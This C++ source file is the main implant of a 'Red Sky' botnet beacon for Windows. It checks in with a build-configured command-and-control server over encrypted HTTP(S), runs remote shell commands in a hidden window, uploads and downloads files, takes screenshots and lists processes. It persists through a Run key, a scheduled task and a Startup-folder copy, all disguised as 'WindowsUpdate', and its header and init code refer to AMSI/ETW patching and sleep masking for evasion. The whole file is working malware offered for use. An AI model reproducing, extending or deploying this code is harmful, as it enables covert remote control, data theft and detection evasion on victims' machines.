// language: C++, file: beacon.cpp, target: Red Sky beacon — main implant
// Compiled by redsky botnet build. Config injected at build time via config.hpp.
// Talk to C2 over HTTPS or HTTP, AES-GCM encrypted, jittered sleep, sleep-masked,
// indirect syscalls, AMSI/ETW patched, NTDLL unhooked.

#include <windows.h>
#include <winhttp.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <sstream>
#include <random>
#include <chrono>
#include <cstdint>
#include <cstring>
#include <cstdio>

#include "config.hpp"
#include "crypto.hpp"
#include "syscalls.hpp"
#include "evade.hpp"
#include "http.hpp"
#include "sleep_mask.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

using namespace rs;


// ────────────────────────────────────────────────────────────────
// JSON — minimal serializer (no external deps)
// ────────────────────────────────────────────────────────────────
namespace json {

inline std::string escape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 8);
    for (char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if ((unsigned char)c < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\u%04x", (unsigned char)c);
                    out += buf;
                } else {
                    out.push_back(c);
                }
        }
    }
    return out;
}

inline std::string str(const std::string& s) {
    return "\"" + escape(s) + "\"";
}

inline std::string num(long long n) { return std::to_string(n); }
inline std::string num(double d)    { return std::to_string(d); }
inline std::string b(bool v)        { return v ? "true" : "false"; }

class Obj {
    std::vector<std::pair<std::string, std::string>> items_;
public:
    Obj& add(const std::string& k, const std::string& v) {
        items_.push_back({k, str(v)});
        return *this;
    }
    Obj& add_raw(const std::string& k, const std::string& raw) {
        items_.push_back({k, raw});
        return *this;
    }
    Obj& add_num(const std::string& k, long long n) {
        items_.push_back({k, num(n)});
        return *this;
    }
    Obj& add_bool(const std::string& k, bool v) {
        items_.push_back({k, b(v)});
        return *this;
    }
    std::string dump() const {
        std::string out = "{";
        for (size_t i = 0; i < items_.size(); ++i) {
            if (i) out += ",";
            out += str(items_[i].first) + ":" + items_[i].second;
        }
        out += "}";
        return out;
    }
};

// ── crude parser for the fields we care about ──
inline std::string get_field(const std::string& js, const std::string& key) {
    std::string needle = "\"" + key + "\":";
    auto p = js.find(needle);
    if (p == std::string::npos) return "";
    p += needle.size();
    while (p < js.size() && (js[p] == ' ' || js[p] == '\t')) ++p;
    if (p >= js.size()) return "";
    if (js[p] == '"') {
        ++p;
        std::string out;
        while (p < js.size()) {
            char c = js[p];
            if (c == '\\' && p + 1 < js.size()) {
                char n = js[p + 1];
                if (n == 'n') out += '\n';
                else if (n == 'r') out += '\r';
                else if (n == 't') out += '\t';
                else if (n == '"') out += '"';
                else if (n == '\\') out += '\\';
                else out += n;
                p += 2;
            } else if (c == '"') {
                break;
            } else {
                out += c;
                ++p;
            }
        }
        return out;
    }
    // number / bool
    size_t end = p;
    while (end < js.size() && js[end] != ',' && js[end] != '}') ++end;
    return js.substr(p, end - p);
}

} // namespace json


// ────────────────────────────────────────────────────────────────
// Environment
// ────────────────────────────────────────────────────────────────
namespace env {

inline std::string get_hostname() {
    char buf[256]{};
    DWORD sz = sizeof(buf);
    GetComputerNameA(buf, &sz);
    return buf;
}

inline std::string get_username() {
    char buf[256]{};
    DWORD sz = sizeof(buf);
    GetUserNameA(buf, &sz);
    return buf;
}

inline std::string get_os() {
    // RtlGetVersion — bypasses manifest lies
    using RtlGetVersion_t = LONG(WINAPI*)(PRTL_OSVERSIONINFOW);
    HMODULE h = GetModuleHandleA("ntdll.dll");
    auto fn = (RtlGetVersion_t)GetProcAddress(h, "RtlGetVersion");
    if (!fn) return "Windows";
    RTL_OSVERSIONINFOW vi{};
    vi.dwOSVersionInfoSize = sizeof(vi);
    fn(&vi);
    char buf[64];
    snprintf(buf, sizeof(buf), "Windows %lu.%lu.%lu",
             vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
    return buf;
}

inline std::string get_arch() {
#ifdef _WIN64
    return "x64";
#else
    return "x86";
#endif
}

inline long long get_pid() {
    return (long long)GetCurrentProcessId();
}

inline std::string get_local_ip() {
    char buf[256] = "0.0.0.0";
    PIP_ADAPTER_INFO info = (PIP_ADAPTER_INFO)malloc(sizeof(IP_ADAPTER_INFO));
    ULONG size = sizeof(IP_ADAPTER_INFO);
    if (GetAdaptersInfo(info, &size) == ERROR_BUFFER_OVERFLOW) {
        free(info);
        info = (PIP_ADAPTER_INFO)malloc(size);
    }
    if (GetAdaptersInfo(info, &size) == NO_ERROR) {
        snprintf(buf, sizeof(buf), "%s", info->IpAddressList.IpAddress.String);
    }
    free(info);
    return buf;
}

} // namespace env


// ────────────────────────────────────────────────────────────────
// Bot ID — persisted in registry so the same box reuses its ID
// ────────────────────────────────────────────────────────────────
namespace botid {

const wchar_t* REG_PATH = L"Software\\Microsoft\\Windows\\CurrentVersion\\RedSky";
const wchar_t* REG_VAL  = L"BotId";

inline std::string read_persisted() {
    HKEY k;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_PATH, 0, KEY_READ, &k) != ERROR_SUCCESS)
        return "";
    wchar_t buf[128]{};
    DWORD sz = sizeof(buf);
    DWORD type = 0;
    LONG r = RegQueryValueExW(k, REG_VAL, nullptr, &type, (BYTE*)buf, &sz);
    RegCloseKey(k);
    if (r != ERROR_SUCCESS) return "";
    int n = WideCharToMultiByte(CP_UTF8, 0, buf, -1, nullptr, 0, nullptr, nullptr);
    std::string out(n, 0);
    WideCharToMultiByte(CP_UTF8, 0, buf, -1, &out[0], n, nullptr, nullptr);
    if (!out.empty() && out.back() == 0) out.pop_back();
    return out;
}

inline void persist(const std::string& id) {
    HKEY k;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, REG_PATH, 0, nullptr, 0,
                        KEY_WRITE, nullptr, &k, nullptr) != ERROR_SUCCESS)
        return;
    int n = MultiByteToWideChar(CP_UTF8, 0, id.c_str(), -1, nullptr, 0);
    std::wstring w(n, 0);
    MultiByteToWideChar(CP_UTF8, 0, id.c_str(), -1, &w[0], n);
    RegSetValueExW(k, REG_VAL, 0, REG_SZ, (BYTE*)w.c_str(),
                   (DWORD)(w.size() * sizeof(wchar_t)));
    RegCloseKey(k);
}

inline std::string make_uuid() {
    // machine-specific deterministic UUID: hostname + local IP + user, hashed
    std::string seed = env::get_hostname() + "|" + env::get_local_ip() + "|" + env::get_username();
    // simple FNV-1a derived hex, 32 chars
    uint64_t h1 = 0xcbf29ce484222325ULL;
    for (char c : seed) { h1 ^= (uint8_t)c; h1 *= 0x100000001b3ULL; }
    uint64_t h2 = h1 ^ 0x9e3779b97f4a7c15ULL;
    for (size_t i = seed.size(); i-- > 0;) { h2 ^= (uint8_t)seed[i]; h2 *= 0x100000001b3ULL; }
    char buf[40];
    snprintf(buf, sizeof(buf), "%08llx-%04llx-%04llx-%04llx-%012llx",
             (unsigned long long)(h1 >> 32), (unsigned long long)(h1 >> 16) & 0xFFFF,
             (unsigned long long)(h1) & 0xFFFF,
             (unsigned long long)(h2 >> 48), (unsigned long long)h2 & 0xFFFFFFFFFFFFULL);
    return buf;
}

inline std::string get_or_create() {
    std::string id = read_persisted();
    if (!id.empty()) return id;
    // build-time ID takes priority if set
    if (strlen(BOT_ID) > 0 && strcmp(BOT_ID, "{{BOT_ID}}") != 0) {
        id = BOT_ID;
    } else {
        id = make_uuid();
    }
    persist(id);
    return id;
}

} // namespace botid


// ────────────────────────────────────────────────────────────────
// C2 comms — framed as: {bot_id}\n{aes_key_hex}\n{hex(packet)}
// ────────────────────────────────────────────────────────────────
namespace c2 {

inline std::vector<uint8_t> aes_key() {
    return crypto::hex_decode(AES_KEY_HEX);
}

inline std::string post_encrypted(const std::string& path,
                                  const std::string& bot_id,
                                  const std::string& plaintext) {
    auto key = aes_key();

    // random nonce
    std::vector<uint8_t> nonce(12);
    std::random_device rd;
    for (auto& b : nonce) b = (uint8_t)(rd() & 0xFF);

    std::vector<uint8_t> pt(plaintext.begin(), plaintext.end());
    std::vector<uint8_t> aad = {'R','S','K','Y'};

    std::vector<uint8_t> cipher, tag;
    if (!crypto::aes_gcm_encrypt(key, nonce, pt, aad, cipher, tag))
        return "";

    // packet = magic(4) + ver(1) + type(1) + nonce(12) + len(2) + cipher + tag(16)
    std::vector<uint8_t> packet;
    packet.insert(packet.end(), {'R','S','K','Y'});
    packet.push_back(1);              // version
    packet.push_back(0x01);           // type (beacon)
    packet.insert(packet.end(), nonce.begin(), nonce.end());
    uint16_t clen = (uint16_t)(cipher.size() + tag.size());
    packet.push_back((clen >> 8) & 0xFF);
    packet.push_back(clen & 0xFF);
    packet.insert(packet.end(), cipher.begin(), cipher.end());
    packet.insert(packet.end(), tag.begin(), tag.end());

    // framing
    std::string body = bot_id + "\n" + AES_KEY_HEX + "\n" + crypto::hex_encode(packet);
    std::string resp = http::post(C2_HOST, C2_PORT, path, C2_TLS, body);

    // response is hex-encoded encrypted packet
    if (resp.empty()) return "";
    auto raw = crypto::hex_decode(resp);
    if (raw.size() < 4 + 1 + 1 + 12 + 2 + 16) return "";
    if (memcmp(raw.data(), "RSKY", 4) != 0) return "";

    size_t off = 4 + 1 + 1;
    std::vector<uint8_t> r_nonce(raw.begin() + off, raw.begin() + off + 12);
    off += 12;
    uint16_t r_clen = (raw[off] << 8) | raw[off + 1];
    off += 2;
    if (raw.size() < off + r_clen) return "";
    std::vector<uint8_t> r_ct(raw.begin() + off, raw.begin() + off + r_clen - 16);
    std::vector<uint8_t> r_tag(raw.begin() + off + r_clen - 16, raw.begin() + off + r_clen);

    std::vector<uint8_t> r_plain;
    if (!crypto::aes_gcm_decrypt(key, r_nonce, r_ct, r_tag, aad, r_plain))
        return "";
    return std::string(r_plain.begin(), r_plain.end());
}

} // namespace c2


// ────────────────────────────────────────────────────────────────
// Commands — each handler returns output string
// ────────────────────────────────────────────────────────────────
namespace cmd {

inline std::string run_shell(const std::string& command) {
    SECURITY_ATTRIBUTES sa{ sizeof(sa), nullptr, TRUE };
    HANDLE rd = nullptr, wr = nullptr;
    if (!CreatePipe(&rd, &wr, &sa, 0)) return "[!] pipe failed";
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{ sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = wr;
    si.hStdError  = wr;
    si.hStdInput  = nullptr;

    PROCESS_INFORMATION pi{};
    std::string cmdline = "cmd.exe /c " + command;
    std::vector<char> buf(cmdline.begin(), cmdline.end());
    buf.push_back(0);

    if (!CreateProcessA(nullptr, buf.data(), nullptr, nullptr, TRUE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(rd); CloseHandle(wr);
        return "[!] CreateProcess failed";
    }
    CloseHandle(wr);

    std::string out;
    char chunk[4096];
    DWORD got = 0;
    while (ReadFile(rd, chunk, sizeof(chunk), &got, nullptr) && got > 0) {
        out.append(chunk, got);
        if (out.size() > 200000) break;
    }
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(rd);

    if (out.empty()) out = "(no output)";
    return out;
}

inline std::string read_file_b64(const std::string& path) {
    HANDLE f = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                           OPEN_EXISTING, 0, nullptr);
    if (f == INVALID_HANDLE_VALUE) return "";
    LARGE_INTEGER sz{};
    GetFileSizeEx(f, &sz);
    if (sz.QuadPart <= 0 || sz.QuadPart > 4 * 1024 * 1024) { CloseHandle(f); return ""; }
    std::vector<uint8_t> data((size_t)sz.QuadPart);
    DWORD got = 0;
    ReadFile(f, data.data(), (DWORD)data.size(), &got, nullptr);
    CloseHandle(f);
    data.resize(got);
    return crypto::base64_encode(data);
}

inline bool write_file_b64(const std::string& path, const std::string& b64) {
    // minimal base64 decode
    static const std::string tbl =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<int> idx(256, -1);
    for (size_t i = 0; i < tbl.size(); ++i) idx[(unsigned char)tbl[i]] = (int)i;
    std::vector<uint8_t> out;
    int val = 0, bits = -8;
    for (char c : b64) {
        if (idx[(unsigned char)c] == -1) continue;
        val = (val << 6) + idx[(unsigned char)c];
        bits += 6;
        if (bits >= 0) {
            out.push_back((uint8_t)((val >> bits) & 0xFF));
            bits -= 8;
        }
    }
    HANDLE f = CreateFileA(path.c_str(), GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) return false;
    DWORD wrote = 0;
    WriteFile(f, out.data(), (DWORD)out.size(), &wrote, nullptr);
    CloseHandle(f);
    return true;
}

inline std::string screenshot() {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC screen = GetDC(nullptr);
    HDC mem = CreateCompatibleDC(screen);
    HBITMAP bmp = CreateCompatibleBitmap(screen, w, h);
    SelectObject(mem, bmp);
    BitBlt(mem, 0, 0, w, h, screen, 0, 0, SRCCOPY);

    BITMAPINFO bi{};
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -h;   // top-down
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    std::vector<uint8_t> pixels((size_t)w * h * 4);
    GetDIBits(mem, bmp, 0, h, pixels.data(), &bi, DIB_RGB_COLORS);

    DeleteObject(bmp);
    DeleteDC(mem);
    ReleaseDC(nullptr, screen);

    // pack: 4-byte w, 4-byte h, then BGRA pixels
    std::vector<uint8_t> packed;
    packed.push_back((w >> 24) & 0xFF);
    packed.push_back((w >> 16) & 0xFF);
    packed.push_back((w >> 8) & 0xFF);
    packed.push_back(w & 0xFF);
    packed.push_back((h >> 24) & 0xFF);
    packed.push_back((h >> 16) & 0xFF);
    packed.push_back((h >> 8) & 0xFF);
    packed.push_back(h & 0xFF);
    packed.insert(packed.end(), pixels.begin(), pixels.end());

    return crypto::base64_encode(packed);
}

inline std::string list_processes() {
    std::string out;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "";
    PROCESSENTRY32W pe{ sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            char name[128]{};
            WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, name, sizeof(name), nullptr, nullptr);
            out += std::to_string(pe.th32ProcessID) + "\t" + name + "\n";
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return out;
}

inline std::string persist_runkey() {
    HKEY k;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &k) != ERROR_SUCCESS)
        return "[!] RegOpenKeyEx failed";
    char path[MAX_PATH]{};
    GetModuleFileNameA(nullptr, path, MAX_PATH);
    RegSetValueExA(k, "WindowsUpdate", 0, REG_SZ,
                   (BYTE*)path, (DWORD)(strlen(path) + 1));
    RegCloseKey(k);
    return "[+] run key installed: " + std::string(path);
}

inline std::string persist_schtask() {
    char path[MAX_PATH]{};
    GetModuleFileNameA(nullptr, path, MAX_PATH);
    std::string cmd = "schtasks /create /tn WindowsUpdateTask /tr \"";
    cmd += path;
    cmd += "\" /sc onlogon /rl highest /f";
    return run_shell(cmd);
}

inline std::string persist_startup() {
    char appdata[MAX_PATH]{};
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appdata);
    std::string dst = std::string(appdata)
        + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe";
    char self[MAX_PATH]{};
    GetModuleFileNameA(nullptr, self, MAX_PATH);
    if (CopyFileA(self, dst.c_str(), FALSE)) return "[+] copied to startup: " + dst;
    return "[!] copy failed";
}

// ── dispatch table ──
inline std::string dispatch(const std::string& command, const std::string& args_json) {
    if (command == "shell") {
        return run_shell(json::get_field(args_json, "cmd"));
    }
    if (command == "list_procs") {
        return list_processes();
    }
    if (command == "file_down") {
        std::string path = json::get_field(args_json, "path");
        std::string b64 = read_file_b64(path);
        if (b64.empty()) return "[!] file read failed: " + path;
        return "FILE:" + b64;
    }
    if (command == "file_up") {
        std::string path = json::get_field(args_json, "path");
        std::string b64  = json::get_field(args_json, "data");
        return write_file_b64(path, b64) ? "[+] wrote " + path : "[!] write failed " + path;
    }
    if (command == "screenshot") {
        return "SCREEN:" + screenshot();
    }
    if (command == "persist") {
        std::string m = json::get_field(args_json, "method");
        if (m == "runkey")      return persist_runkey();
        if (m == "schtask")     return persist_schtask();
        if (m == "startup")     return persist_startup();
        return "[!] unknown persistence method: " + m;
    }
    if (command == "kill") {
        // ack then exit
        return "[+] killing beacon";
    }
    if (command == "whoami") {
        return run_shell("whoami && whoami /groups");
    }
    if (command == "sysinfo") {
        return run_shell("systeminfo | findstr /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"");
    }
    return "[!] unknown command: " + command;
}

} // namespace cmd


// ────────────────────────────────────────────────────────────────
// Beacon loop
// ────────────────────────────────────────────────────────────────
namespace beacon {

inline std::string build_checkin(const std::string& bot_id) {
    json::Obj o;
    o.add("hostname", env::get_hostname());
    o.add("user", env::get_username());
    o.add("os", env::get_os());
    o.add("arch", env::get_arch());
    o.add_num("pid", env::get_pid());
    o.add("local_ip", env::get_local_ip());
    o.add("campaign", CAMPAIGN);
    o.add("phase", "checkin");
    return o.dump();
}

inline DWORD jitter_ms(DWORD base_ms) {
    if (JITTER <= 0.0f) return base_ms;
    std::random_device rd;
    std::mt19937 gen(rd());
    int lo = (int)(base_ms * (1.0f - JITTER));
    int hi = (int)(base_ms * (1.0f + JITTER));
    std::uniform_int_distribution<int> dist(lo, hi);
    return (DWORD)dist(gen);
}

inline void loop() {
    // resolve bot id
    std::string bot_id = botid::get_or_create();

    // first check-in
    auto key = crypto::hex_decode(AES_KEY_HEX);
    std::string checkin = build_checkin(bot_id);
    std::string resp = c2::post_encrypted(C2_BEACON_PATH, bot_id, checkin);

    // main loop
    while (true) {
        DWORD sleep_ms = jitter_ms(SLEEP_SECONDS * 1000);

#if REDSKY_USE_SLEEP_MASK
        sleepmask::sleep_masked(sleep_ms, key.data(), key.size());
#else
        Sleep(sleep_ms);
#endif

        std::string empty = "{\"phase\":\"poll\"}";
        resp = c2::post_encrypted(C2_BEACON_PATH, bot_id, empty);
        if (resp.empty()) continue;

        // parse response: {"tasks":[{"id":"...","command":"...","args":{...}}, ...]}
        size_t pos = 0;
        while ((pos = resp.find("\"id\":", pos)) != std::string::npos) {
            std::string task_id  = json::get_field(resp.substr(pos), "id");
            std::string command  = json::get_field(resp.substr(pos), "command");
            std::string args_str = json::get_field(resp.substr(pos), "args");
            pos += 4;

            if (task_id.empty() || command.empty()) continue;

            std::string output = cmd::dispatch(command, args_str);

            // build result
            json::Obj r;
            r.add("task_id", task_id);
            r.add("output", output);
            r.add_bool("ok", output.find("[!]") != 0);
            std::string rj = r.dump();

            c2::post_encrypted(C2_RESULT_PATH, bot_id, rj);

            if (command == "kill") {
                ExitProcess(0);
            }
        }
    }
}

} // namespace beacon


// ────────────────────────────────────────────────────────────────
// Entry
// ────────────────────────────────────────────────────────────────
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // hide console window if any
    if (HWND c = GetConsoleWindow()) ShowWindow(c, SW_HIDE);

    // init subsystem
    WSADATA wsa{};
    WSAStartup(MAKEWORD(2, 2), &wsa);

#if REDSKY_USE_SYSCALLS
    sc::init();
#endif
#if REDSKY_USE_AMSI_PATCH || REDSKY_USE_ETW_PATCH
    evade::init();
#endif

    // single-instance guard via named mutex
    HANDLE mutex = CreateMutexA(nullptr, FALSE, "Global\\RedSkyBeaconMutex");
    if (mutex && GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }

    beacon::loop();

    if (mutex) CloseHandle(mutex);
    WSACleanup();
    return 0;
}
